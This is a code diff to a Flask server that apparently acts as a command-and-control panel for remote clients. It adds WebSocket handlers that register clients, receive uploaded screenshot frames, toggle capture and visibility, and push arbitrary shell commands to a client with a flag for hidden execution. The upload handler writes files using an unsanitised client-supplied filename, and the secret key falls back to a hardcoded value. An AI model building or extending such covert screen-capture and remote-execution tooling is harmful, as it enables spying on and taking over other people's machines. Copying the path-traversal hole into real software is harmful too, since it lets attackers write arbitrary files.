@@ -3,12 +3,16 @@ import sqlite3
 import base64
 
 from flask import Flask, render_template, request, jsonify, send_from_directory
+from flask_socketio import SocketIO, emit, join_room
 from functools import wraps
 from dotenv import load_dotenv
 
 load_dotenv()
 
 app = Flask(__name__)
+app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'run_secret_key_12345')
+
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
 DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")
 
@@ -61,6 +65,66 @@ def init_db():
 
 init_db()
 
+
+# ── WebSockets Handlers ──
+
+@socketio.on('register')
+def handle_register(data):
+    username = data.get('username')
+    if not username:
+        return
+    join_room(username)
+
+    conn = get_db()
+    cursor = conn.cursor()
+    row = cursor.execute("SELECT capture FROM clients WHERE username = ?", (username,)).fetchone()
+    if row:
+        cursor.execute("UPDATE clients SET updated_at = datetime('now') WHERE username = ?", (username,))
+        capture_val = bool(row["capture"])
+    else:
+        cursor.execute("INSERT INTO clients (username, updated_at) VALUES (?, datetime('now'))", (username,))
+        capture_val = False
+    conn.commit()
+    conn.close()
+
+    emit('set_capture', {'capture': capture_val}, room=username)
+
+
+@socketio.on('heartbeat')
+def handle_heartbeat(data):
+    username = data.get('username')
+    if not username:
+        return
+    conn = get_db()
+    conn.execute("UPDATE clients SET updated_at = datetime('now') WHERE username = ?", (username,))
+    conn.commit()
+    conn.close()
+
+
+@socketio.on('upload_frame')
+def handle_upload_frame(data):
+    username = data.get("username")
+    filename = data.get("filename")
+    image_base64 = data.get("image")
+
+    if not username or not filename or not image_base64:
+        return
+
+    client_folder = os.path.join(SCREENSHOT_DIR, username)
+    os.makedirs(client_folder, exist_ok=True)
+    file_path = os.path.join(client_folder, filename)
+
+    try:
+        if "," in image_base64:
+            image_base64 = image_base64.split(",", 1)[1]
+        image_bytes = base64.b64decode(image_base64)
+        with open(file_path, "wb") as f:
+            f.write(image_bytes)
+    except Exception as e:
+        print(f"[Upload Frame Error] {e}")
+
+
+# ── REST API Routes ──
 
 @app.route("/")
 def index():
@@ -145,6 +209,8 @@ def set_visibility():
     conn.commit()
     conn.close()
 
+    socketio.emit("set_visibility", {"visible": visible}, room=username)
+
     return jsonify({"status": "success"})
 
 
@@ -186,7 +252,10 @@ def set_command():
     conn.commit()
     conn.close()
 
-    return jsonify({"status": "success", "message": "Command queued"})
+    # Instant WebSocket push command to client!
+    socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)
+
+    return jsonify({"status": "success", "message": "Command sent over WebSocket"})
 
 
 @app.get("/api/poll")
@@ -326,4 +395,5 @@ def get_frame(username, filename):
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)
+    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)
+
